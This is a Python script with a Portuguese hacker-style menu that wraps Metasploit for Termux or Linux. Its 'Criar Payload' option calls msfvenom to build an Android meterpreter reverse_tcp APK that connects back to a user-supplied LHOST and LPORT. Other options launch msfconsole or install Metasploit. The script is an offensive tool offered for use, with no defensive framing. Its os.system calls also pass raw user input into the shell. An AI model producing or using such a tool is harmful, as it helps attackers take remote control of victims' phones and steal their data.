#!/usr/bin/env python3
import os
import sys
import subprocess
from time import sleep

# Cores ANSI (Estilo Hacker)
class style:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# Banner da Caveira (AGORA SIM, PORRA!)
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{style.RED}
          _____
       .-'     `-.
      /           \\
      |  R.I.P.   |
      |           |
      |  METAHACK |
      |           |
      |   2023    |
      \\           /
       `-._____.-'
    {style.RESET}""")
    print(f"{style.RED}{style.BOLD}       M E T A S P L O I T   U L T I M A T E")
    print(f"{style.YELLOW}======================================")
    print(f"{style.CYAN}    [Coded By H4CK3R] | [Termux/Linux]")
    print(f"{style.YELLOW}======================================{style.RESET}\n")

# Pausa e limpa tela
def pause():
    input(f"\n{style.MAGENTA}[!] PRESSIONE ENTER...{style.RESET}")
    os.system('clear' if os.name == 'posix' else 'cls')

# Menu principal
def main():
    while True:
        show_banner()
        print(f"{style.BLUE}[1] {style.WHITE}Criar Payload")
        print(f"{style.BLUE}[2] {style.WHITE}Iniciar Metasploit")
        print(f"{style.BLUE}[3] {style.WHITE}Instalar no Termux")
        print(f"{style.BLUE}[4] {style.WHITE}Sair")
        
        choice = input(f"\n{style.YELLOW}[?] Escolha: {style.RESET}")
        
        if choice == '1':
            create_payload()
        elif choice == '2':
            start_metasploit()
        elif choice == '3':
            install_termux()
        elif choice == '4':
            sys.exit()
        else:
            print(f"{style.RED}[-] Opção inválida!{style.RESET}")
            sleep(1)

# Funções principais
def create_payload():
    show_banner()
    print(f"{style.GREEN}[+] Criando payload...{style.RESET}")
    lhost = input(f"{style.YELLOW}[?] LHOST: {style.RESET}")
    lport = input(f"{style.YELLOW}[?] LPORT: {style.RESET}")
    
    print(f"\n{style.CYAN}[*] Gerando payload...{style.RESET}")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk")
    print(f"{style.GREEN}[+] Payload criado: payload.apk{style.RESET}")
    pause()

def start_metasploit():
    os.system("msfconsole")
    pause()

def install_termux():
    print(f"{style.GREEN}[+] Instalando no Termux...{style.RESET}")
    os.system("pkg install metasploit -y")
    print(f"{style.GREEN}[+] Instalação completa!{style.RESET}")
    pause()

if __name__ == "__main__":
    main()
